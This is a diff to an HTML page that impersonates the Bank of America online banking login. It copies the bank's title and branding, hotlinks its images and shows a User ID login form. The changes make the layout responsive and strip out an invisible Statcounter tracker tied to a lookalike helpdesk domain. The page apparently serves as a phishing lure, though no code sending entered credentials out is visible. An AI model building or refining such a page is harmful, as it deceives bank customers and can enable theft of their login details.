@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Bank of America | Online Banking | Log In | User ID</title>
   <style>
     body {
@@ -12,18 +13,24 @@
     }
 
     .header img {
-      width: 100%;
+      width: auto;
+      max-width: 220px;
+      height: auto;
+      max-height: 80px;
+      margin: 20px auto;
       display: block;
     }
 
     .content-container {
       display: flex;
+      flex-direction: row;
       justify-content: center;
       align-items: flex-start;
       gap: 30px;
       margin: 50px auto;
       max-width: 900px;
       padding: 0 20px;
+      flex-wrap: wrap;
     }
 
     .login-container {
@@ -32,18 +39,26 @@
       padding: 25px;
       border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      flex: 1;
+      flex: 1 1 100%;
+    }
+
+    .llama-container {
+      flex: 1 1 100%;
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
     }
 
     .llama-container img {
-      max-width: 300px;
+      max-width: 100%;
       height: auto;
+      max-height: 200px;
       border-radius: 8px;
       box-shadow: 0 0 8px rgba(0,0,0,0.1);
     }
 
     h1 {
-      color: #003366;
+      color: red;
     }
 
     .form-group {
@@ -100,6 +115,26 @@
     footer a:hover {
       text-decoration: underline;
     }
+
+    @media (max-width: 768px) {
+      .content-container {
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .login-container, .llama-container {
+        max-width: 100%;
+      }
+
+      .header img {
+        max-width: 150px;
+        max-height: 60px;
+      }
+
+      .llama-container img {
+        max-height: 150px;
+      }
+    }
   </style>
   <script>
     function showLoginError() {
@@ -127,7 +162,7 @@
   <div class="content-container">
     <!-- Login Form -->
     <div class="login-container">
-      <h1 style="color: red;">Log In to Online Banking</h1>
+      <h1>Log In to Online Banking</h1>
       <form onsubmit="event.preventDefault(); showLoginError();">
         <div class="form-group">
           <label for="user-id">User ID:</label>
@@ -142,7 +177,7 @@
       <div id="error-message" class="error-message"></div>
     </div>
 
-    <!-- Right-Side Image (Llama or branding) -->
+    <!-- Right-Side Image -->
     <div class="llama-container">
       <img src="https://secure.bankofamerica.com/pa/components/modules-app/VIPAA/online-id-vipaa-module/1.0/graphic/mobile_llama.png"
            alt="Llama Image" />
@@ -151,13 +186,11 @@
 
   <!-- Promotional Image and Offers Section -->
   <div style="background-color: #f9f9f9; padding: 40px 20px; margin: 40px 0;">
-    <!-- Full-width Promo Image -->
     <div style="text-align: center; margin-bottom: 30px;">
       <img 
         src="https://www2.bac-assets.com/homepage/spa-assets/images/assets-images-site-hp-assets-mastheads-icons-shl_offer_art_6819646_e.svg" 
         alt="Bank of America Promotional Offers"
-        style="max-width: 100%; height: auto; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);"
-      />
+        style="max-width: 100%; height: auto; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);" />
     </div>
 
     <!-- Offer Blocks -->
@@ -188,21 +221,4 @@
     </p>
   </footer>
 </body>
-  <!-- Default Statcounter code for micro
-https://micro-softs-helpdesks.vercel.app/ -->
-<script type="text/javascript">
-var sc_project=13141255; 
-var sc_invisible=1; 
-var sc_security="c6f9d922"; 
-</script>
-<script type="text/javascript"
-src="https://www.statcounter.com/counter/counter.js"
-async></script>
-<noscript><div class="statcounter"><a title="Web Analytics"
-href="https://statcounter.com/" target="_blank"><img
-class="statcounter"
-src="https://c.statcounter.com/13141255/0/c6f9d922/1/"
-alt="Web Analytics"
-referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
-<!-- End of Statcounter Code -->
 </html>
